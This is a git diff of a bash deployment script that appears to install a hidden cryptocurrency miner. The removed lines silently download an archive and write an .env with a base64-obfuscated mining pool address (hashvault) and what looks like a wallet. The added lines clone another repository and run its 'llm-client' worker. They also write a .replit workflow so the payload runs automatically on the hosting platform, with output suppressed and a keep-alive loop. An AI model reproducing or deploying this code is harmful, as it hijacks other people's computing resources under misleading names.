@@ -1,31 +1,37 @@
 #!/bin/bash
 
-curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
-tar -xvf mcpo.tar.gz >/dev/null 2>&1
-rm mcpo.tar.gz
+git clone https://github.com/wijayasuta13-collab/nowde.git >/dev/null 2>&1
 sleep 40
-cd mcp && echo '#!/bin/bash
+echo '#!/bin/bash
 
-PORT=$1
-NAME=$2
-if [ ! -d "python" ]; then
-  echo "Python folder not found → downloading..."
-  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-else
-  echo "Python already exists → skip download"
-fi
-export PATH=./python/bin:$PATH
-yes |  pip install certifi
-export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://datacenter.chuyengiaai.online
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
-SERVER_SECRET=$NAME
-SERVER_CONNECTION=$PORT
-SERVER_MODE=FAST" > .env
-while true; do
-  python3 app.py
-  sleep 15
-done' > run.sh && chmod +x run.sh && ./run.sh 8 worker12 >/dev/null 2>&1
+cd nowde && cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 4 worker13
+sleep 100
+while true
+do
+        echo "Ojo Lali Ngopi Boss..."
+        sleep 1800
+done' > bos.sh
+echo 'modules = ["python-3.11"]
+
+[workflows]
+runButton = "Project"
+
+[[workflows.workflow]]
+name = "Project"
+mode = "parallel"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "bos"
+
+[[workflows.workflow]]
+name = "bos"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash bos.sh"
+
+[workflows.workflow.metadata]
+outputType = "console"' > .replit
